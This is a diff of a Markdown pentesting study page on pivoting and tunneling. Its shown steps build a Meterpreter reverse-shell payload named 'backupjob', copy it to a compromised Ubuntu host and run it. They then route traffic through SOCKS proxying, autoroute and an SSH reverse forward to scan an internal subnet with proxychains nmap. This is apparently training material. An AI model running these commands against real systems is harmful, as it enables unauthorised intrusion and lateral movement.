@@ -1,6 +1,11 @@
-
-
-
+---
+title: Pivoting, Tunneling, and Port Forwarding
+author: amandaguglieri
+draft: false
+TableOfContents: true
+tags:
+  - pentesting
+---
 # Pivoting, Tunneling, and Port Forwarding
 
 **Lateral movement** is a technique that adversaries use, after compromising an endpoint, to extend access to other hosts or applications in an organization.
@@ -327,12 +332,14 @@ Autoroute module allows you to set routes from a meterpreter session to a discov
 **1.** Create a payload for Ubuntu Pivot Host (our victim's machine 1):
 
 ```shell-session
+# From the kali attacker machine
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o backupjob LPORT=8080
 ```
 
 **2.** Start a multi/handler, also known as a Generic Payload Handler.
 
 ```shell-session
+# From the kali attacker machine
 msfconsole -q
 use exploit/multi/handler
 set lhost 0.0.0.0
@@ -344,11 +351,11 @@ run
 **3.** Copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.
 
 ```shell-session
-# From kali, we copy the file
-scp backupjob $username@$ip:~/
+# From kali, we copy the file to the Ubuntu compromised machine
+scp backupjob $username@$ipUbuntuCompromisedmachine:~/
 
 # Connect to the victim's machine
-ssh $username@$ip
+ssh $username@$ipUbuntuCompromisedmachine
 chmod +x backupjob 
 
 # And execute it
@@ -356,7 +363,7 @@ chmod +x backupjob
 ```
 
 
-**4.** Once the meterpreter Session is established, use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host.
+**4.** Once the meterpreter Session is established, send the session to the background with CTRL-z and in the same terminal use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host.
 
 ```shell-session
 use auxiliary/server/socks_proxy
@@ -366,11 +373,11 @@ set version 4a
 run
 # This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
 
-# This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
+# This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session. Even though the command line has not returned anything you can ask for the jobs in execution with:
 jobs
 ```
 
-**5.** Add a Line to proxychains.conf if needed.
+**5.** Add a Line to proxychains.conf if needed (in your kali machine).
 
 ```shell-session
 socks4 	127.0.0.1 9050
@@ -383,17 +390,25 @@ socks4 	127.0.0.1 9050
 use post/multi/manage/autoroute
 set SESSION 1
 set SUBNET $NewSubnet
+# Example: set SUBNET 172.16.5.0
 run
 # this will bind session 1 to the $NewSubnet discovered in the victim's machine 1, doing the pivoting
 
 # It is also possible to add routes with autoroute by running autoroute from the initial Meterpreter session (session 1):
-run autoroute -s $NewDiscoveredIp/23
+sessions -i 1
+run autoroute -s $NewDiscoveredIp/16
 
 # List the active routes:
 run autoroute -p
 ```
 
-**7.**  Finally, use proxychains to route our Nmap traffic via our Meterpreter session.
+**7.**  Make sure that you will get back the communications with a reverse proxy:
+
+```
+ssh -i id_rsa $username@$ipUbuntuCompromisedmachine -R $ip:8080:0.0.0.0:8000
+```
+
+**8.** Finally, use proxychains to route our Nmap traffic via our Meterpreter session.
 
 ```shell-session
 proxychains nmap $NewDiscoveredIp -p3389 -sT -v -Pn
